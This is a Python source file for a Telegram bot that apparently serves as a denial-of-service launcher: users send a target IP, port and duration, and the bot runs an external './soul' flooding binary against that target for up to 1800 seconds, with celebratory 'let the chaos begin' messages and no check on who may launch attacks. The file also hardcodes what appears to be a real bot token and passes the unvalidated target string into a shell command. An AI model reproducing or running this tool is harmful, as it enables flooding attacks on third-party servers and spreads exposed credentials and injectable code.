import os
import telebot
import logging
import time
from datetime import datetime
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7434181472:AAEI0QDLIpuXBorN-qPKUhwrV6OJzUKjUyg'

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 200")
    await process.communicate()
    bot.attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id

    if bot.attack_in_progress:
        bot.send_message(chat_id, "*⚠️ Please wait!*\n"
                                   "*The bot is busy with another attack.*\n"
                                   "*Check remaining time with the /when command.*", parse_mode='Markdown')
        return

    bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                               "*Please provide the target IP, port, and duration in seconds.*\n"
                               "*Example: 167.67.25 6296 1800* 🔥\n"
                               "*Let the chaos begin! 🎉*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"
                                               "*Please use the correct format and try again.*\n"
                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')
            return
        if duration > 1800:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 1800 seconds.*\n"
                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')
            return  

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"
                                           f"*📡 Target Host: {target_ip}*\n"
                                           f"*👉 Target Port: {target_port}*\n"
                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = bot.attack_duration - elapsed_time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')

# Start bot polling
bot.infinity_polling()
